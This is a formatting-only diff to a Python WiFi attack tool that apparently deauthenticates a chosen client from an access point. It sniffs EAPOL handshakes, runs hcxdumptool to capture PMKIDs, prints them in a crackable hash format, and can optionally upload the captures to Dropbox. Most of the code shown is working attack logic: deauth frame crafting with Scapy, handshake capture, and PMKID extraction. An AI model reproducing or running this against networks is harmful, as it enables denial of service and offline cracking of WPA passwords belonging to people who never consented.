@@ -15,6 +15,7 @@ from scapy.sendrecv import sendp, sniff
 from scapy.utils import PcapWriter
 global pmkid_file
 
+
 class bcolors:
     HEADER = '\033[95m'
     OKBLUE = '\033[94m'
@@ -24,12 +25,13 @@ class bcolors:
     FAIL = '\033[91m'
     ENDC = '\033[0m'
 
+
 # CONSTS
 DROPBOX_KEY_PATH = 'DropboxKey.txt'
-HS_TIMEOUT_AFTER_DEAUTH = 5 # In seconds
+HS_TIMEOUT_AFTER_DEAUTH = 5  # In seconds
 DEFAULT_NETWORK_INTERFACE = "wlan0"
 ENABLE_DROPBOX_UPLOAD = False
-pmkid_timeout = 10 # In seconds
+PMKID_TIMEOUT = 10  # In seconds
 packet_list = []
 
 
@@ -82,7 +84,8 @@ __        __  _____     ____                   _   _
 
 def check_args():
     parser = argparse.ArgumentParser(description='Custom WiFi Deauthenticator')
-    parser.add_argument('-i', '--interface', help='Define Network Interface in Monitor Mode, Default: ' + DEFAULT_NETWORK_INTERFACE,
+    parser.add_argument('-i', '--interface', help='Define Network Interface in Monitor Mode, Default: ' + 
+                                                  DEFAULT_NETWORK_INTERFACE,
                         default=DEFAULT_NETWORK_INTERFACE, dest='iface')
     parser.add_argument('-a', '--ap', help='AP MAC Address (UPPER), Default: None', required=True, dest='ap')
     parser.add_argument('-c', '--client', help='Client MAC Address (UPPER), Default: None', required=True,
@@ -90,15 +93,17 @@ def check_args():
     parser.add_argument('-C', '--channel', help='AP Channel, Default: None', type=int, required=True, dest='channel')
     parser.add_argument('-d', '--deauth', help='Number of Deauth packets to send, Default: 1', type=int, default='1',
                         dest='deauth_count')
-    parser.add_argument('-t', '--timeout', help='Number of seconds to wait for handshake after deauth, Default: ' + str(HS_TIMEOUT_AFTER_DEAUTH),
+    parser.add_argument('-t', '--timeout', help='Number of seconds to wait for handshake after deauth, Default: ' + 
+                                                str(HS_TIMEOUT_AFTER_DEAUTH),
                         type=int, default=HS_TIMEOUT_AFTER_DEAUTH, dest='timeout')
     parser.add_argument('-p', '--pcap', help='PCAP file to save EAPOL Packets Automatically Appended Current Time, '
                                              'Default: sniffed_current_date.pcap', default='sniffed.pcap',
                         dest='pcap_file')
-    parser.add_argument('-u', '--upload', help='Upload to Drobox. Default= ' + str(ENABLE_DROPBOX_UPLOAD), default=ENABLE_DROPBOX_UPLOAD, action="store_true", dest="enable_upload")
+    parser.add_argument('-u', '--upload', help='Upload to Drobox. Default= ' + str(ENABLE_DROPBOX_UPLOAD), 
+                        default=ENABLE_DROPBOX_UPLOAD, action="store_true", dest="enable_upload")
     results = parser.parse_args()
     return results.iface, results.ap, results.client, results.channel, results.deauth_count, \
-           results.timeout, results.pcap_file, results.enable_upload
+        results.timeout, results.pcap_file, results.enable_upload
 
 
 def sniffer():
@@ -135,13 +140,13 @@ def try_pmkid(iface, pcap_file, channel, ap):
                 subtype = packet.wlan.fc_type_subtype.showname_value
 
                 if 'QoS Data' in subtype:
-                    print(f"Found PMKID: {packet.eapol.wlan_rsn_ie_pmkid.replace(':', '')}*{packet.wlan.sa.replace(':', '')}*{packet.wlan.da.replace(':', '')}")
+                    print(f"Found PMKID: {packet.eapol.wlan_rsn_ie_pmkid.replace(':', '')}"
+                          f"*{packet.wlan.sa.replace(':', '')}*{packet.wlan.da.replace(':', '')}")
                     return
             except:
                 pass
 
         print("Didn't find PMKID!")
-
 
     ap_file = open('ap_filter.mac', 'w+')
     ap_file.write(ap.strip().upper())
@@ -150,11 +155,13 @@ def try_pmkid(iface, pcap_file, channel, ap):
     mac = os.path.abspath(os.getcwd() + '/ap_filter.mac')
     print(mac)
     try:
-        subprocess.run(f"hcxdumptool -i {iface} -o {pmkid_file} -c {channel} --filtermode=2 --filterlist_ap={mac}", shell=True, timeout=pmkid_timeout)
+        subprocess.run(f"hcxdumptool -i {iface} -o {pmkid_file} -c {channel} --filtermode=2 --filterlist_ap={mac}",
+                       shell=True, timeout=PMKID_TIMEOUT)
 
     except subprocess.TimeoutExpired:
         _find_pmkids(pmkid_file)
         subprocess.call('killall hcxdumptool', shell=True)
+
 
 def send_deauth_packet():
     pkt1 = RadioTap() / Dot11(addr1=client, addr2=ap, addr3=ap) / Dot11Deauth()
